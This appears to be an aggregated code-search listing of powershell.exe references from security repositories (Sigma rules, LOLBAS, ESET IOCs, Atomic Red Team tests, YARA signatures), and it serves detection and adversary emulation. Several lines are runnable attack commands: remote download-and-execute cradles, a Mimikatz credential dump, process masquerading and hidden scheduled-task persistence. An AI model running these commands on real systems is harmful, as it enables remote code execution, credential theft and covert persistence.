[sigma](https://github.com/Neo23x0/sigma) | [sysmon_alternate_powershell_hosts_pipe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_alternate_powershell_hosts_pipe.yml) | `description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_alternate_powershell_hosts_pipe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_alternate_powershell_hosts_pipe.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_susp_powershell_rundll32.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_susp_powershell_rundll32.yml) | `SourceImage: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Powershell.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml) | `Name: Powershell.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Powershell.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml) | `- C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Powershell.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml) | `- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Agentexecutor.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml) | `Description: Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Agentexecutor.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml) | `Description: If we place a binary named powershell.exe in the path c:\temp, agentexecutor.exe will execute it successfully` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mftrace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | `- Command: Mftrace.exe powershell.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mftrace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | `Usecase: Local execution of powershell.exe as a subprocess of Mftrace.exe.` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [misp-dukes-operation-ghost-event.json](https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json) | `"description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [misp-dukes-operation-ghost-event.json](https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json) | `"https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [misp_invisimole.json](https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json) | `"description": "Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [oceanlotus-rtf_ocx_campaigns.misp.event.json](https://github.com/eset/malware-ioc/blob/master/oceanlotus/oceanlotus-rtf_ocx_campaigns.misp.event.json) | `"description": "An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.\n\nDetection: Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate\/Decode Files or Information in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and execuited on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: Anti-virus, Process command-line parameters, Process monitoring\n\nPermissions Required: User",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [oceanlotus-rtf_ocx_campaigns.misp.event.json](https://github.com/eset/malware-ioc/blob/master/oceanlotus/oceanlotus-rtf_ocx_campaigns.misp.event.json) | `"description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\n\nDetection: Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: File monitoring, Packet capture, Mail server, Network intrusion detection system, Detonation chamber, Email gateway",` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | (index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational" \| stats values(CommandLine) by Computer | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | `(index="botsv3" OR index="botsv2") source="WinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe ParentImage=*\\powershell.exe\| stats values(Image) by ParentImage ParentCommandLine` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | `(index="botsv3" OR index="botsv2") source="WinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe CommandLine=*powershell.exe*\| stats values(CommandLine) by Computer` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | `(index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-PowerShell/Operational"` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Atomic_Friday.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md) | `(index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational" \| stats values(CommandLine) by Computer` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [Office_Macro_COM.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md) | objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')", Null, objConfig, intProcessID | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md) | powershell.exe -EncodedCommand $EncodedCommand | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md) | powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | - [Atomic Test #5 - Masquerading - powershell.exe running as taskhostw.exe](#atomic-test-5---masquerading---powershellexe-running-as-taskhostwexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | ## Atomic Test #5 - Masquerading - powershell.exe running as taskhostw.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.004/T1036.004.md) | schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1049.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md) | Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1055.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md) | Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute \| IEX" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | powershell.exe -version 2 -Command Write-Host $PSVersion | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Executes powershell.exe with variations of the -Command parameter | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Executes powershell.exe with variations of the -EncodedCommand parameter | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1123.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md) | powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md) | Spawns a powershell.exe process as a child of the current process. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md) | \| file_path \| File path or name of process to spawn \| path \| $Env:windir&#92;System32&#92;WindowsPowerShell&#92;v1.0&#92;powershell.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md) | Creates a notepad.exe process and then spawns a powershell.exe process as a child of it. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1543.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md) | sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\"" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | \| thing_to_execute \| Thing to Run \| Path \| powershell.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md) | On Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md) | \| powershell_command \| Command to launch calc.exe from a hidden PowerShell Window \| String \| powershell.exe -WindowStyle hidden calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1569.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md) | Upon successful execution, cmd.exe create a new service using sc.exe create that will start powershell.exe to create a new file `art-marker.txt` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1569.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md) | \| executable_command \| Command to execute as a service \| string \| %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:&#92;art-marker.txt\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md) | Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md) | copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt34.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt34.yar) | $x3 = "powershell.exe -exec bypass -enc \" + ${global:$http_ag} +" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_fin7.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fin7.yar) | $x3 = "\\par \\tab \\tab \\tab sh.Run \"powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File \" & pToPSCb, 0, False" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_greenbug.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_greenbug.yar) | $s1 = "powershell.exe -nologo -windowstyle hidden -c \"Set-ExecutionPolicy -scope currentuser" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_greenbug.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_greenbug.yar) | $s2 = "powershell.exe -c \"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
